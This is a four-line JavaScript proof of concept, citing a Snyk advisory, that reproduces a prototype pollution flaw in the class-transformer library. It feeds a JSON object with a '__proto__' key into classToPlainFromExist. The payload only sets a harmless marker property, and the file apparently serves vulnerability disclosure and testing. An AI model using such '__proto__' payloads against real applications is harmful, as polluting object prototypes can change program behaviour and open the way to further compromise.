//https://snyk.io/vuln/SNYK-JS-CLASSTRANSFORMER-564431
const root = require("class-transformer");
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
root.classToPlainFromExist(payload, {});
